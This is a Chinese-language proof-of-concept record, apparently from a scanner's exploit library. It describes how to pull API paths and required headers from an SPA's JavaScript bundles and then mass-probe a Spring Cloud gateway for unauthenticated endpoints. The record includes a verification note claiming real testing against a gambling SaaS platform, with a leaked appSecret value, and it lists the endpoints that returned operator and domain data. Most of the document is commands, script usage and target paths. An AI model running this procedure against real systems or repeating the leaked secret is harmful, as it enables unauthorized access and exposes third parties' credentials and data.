# SPA+Spring Cloud 网关批量未授权接口探测（/xxa 前缀型）

- **code**: spa-spring-cloud-网关批量未授权接口探测-xxa-前缀型
- **kind**: script
- **category**: unauthorized
- **component**: Spring Cloud 多租户博彩 SaaS（/xxa 网关）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 在 https://example.com:9960/xxa 实测：84 个只读接口中 12 个无认证返回业务数据，含 appSecret=adc027b1297f4c06a4573c26bb7e27a8（/longm/api/v1/customerDomain/getCustomerDomain）、同团伙域名清单（/longm/api/v1/domain/pageList）、代理系统域名与运营方手机号（/game/api/v1/background/platform/clientCode/ffty）。无需任何 Cookie，仅需 clientCode/clientItem/language 等业务头。
- **path**: pocs/spa-spring-cloud-网关批量未授权接口探测-xxa-前缀型/poc.py
- **tags**: 未授权访问,Spring Cloud,SPA,接口枚举,配置泄露
- **created_at**: 2026-10-08T11:30:20.787Z
- **found_by**: vuln-scan

## 描述

对 SPA + Spring Cloud 网关型目标：从 JS bundle 提取 API 基址与必填请求头，批量跑只读接口找未授权访问与配置/密钥泄露。

## 用法

```
1) python runs/extract_api.py runs/*.js --out runs/api-from-js.txt
2) 手工整理出只读接口清单 runs/api-paths-safe.txt（排除 delete/update/upload/bet 等改状态路径）
3) python runs/api_unauth.py --base https://TARGET/xxa --paths runs/api-paths-safe.txt --out runs/api-unauth.txt --threads 4 --delay 0.25
4) 命中 {"code":0,"data":...} 的即为未授权接口；把 base 换成 /xxa 之外的其它网关前缀（/sports、/msn）继续试
```

## 正文

```
# 手法：SPA 前端 → 提取 API 基址 → 批量未授权探测
1. 拉首页 example.com，找 JS bundle（Rsbuild/Vue）：
   curl -sSk https://TARGET/ -o home.html
   grep -oE 'src="/js/[^"]+\.js"' home.html
2. 下载全部 chunk 并提取接口路径与请求头约定：
   python extract_api.py js/*.js --out api-from-js.txt
   # 关键：从 axios 拦截器段落抓 clientCode/clientItem/merchantCode/language/device 等必填头，
   #       以及 /url.js 里 target290.example.com='/xxa' 之类的 API 基址
3. 生成只读接口清单并批量探测（GET 带 t= 时间戳，405 则 POST {}）：
   python api_unauth.py --base https://TARGET/xxa --paths api-paths-safe.txt --threads 4 --delay 0.25
4. 判定：HTTP 200 且 {"code":0,"data":非空} = 未授权；Spring Security 401 文案
   "Full authentication is required to access this resource" = 需认证。
5. 高频固定命中接口（本平台实测 12 个未授权）：
   /longm/api/v1/domain/pageList            # 全站域名/文件服务地址
   /longm/api/v1/customerDomain/getCustomerDomain  # appSecret + 客服域名
   /longm/api/v1/menus/list                 # 菜单树（含后台路径线索）
   /longm/api/v1/settings/get/{key}
   /game/api/v1/background/platform/clientCode/{clientCode}   # 代理系统域名/运营联系方式
6. 认证头格式要用真实抓包确认（本平台 /xxa 用 Authorization: <27位短token> 不带 Bearer，
   /sports 用 Authorization: Bearer <JWT>）—— 用 chrome_network_capture 抓 XHR 最准。
```
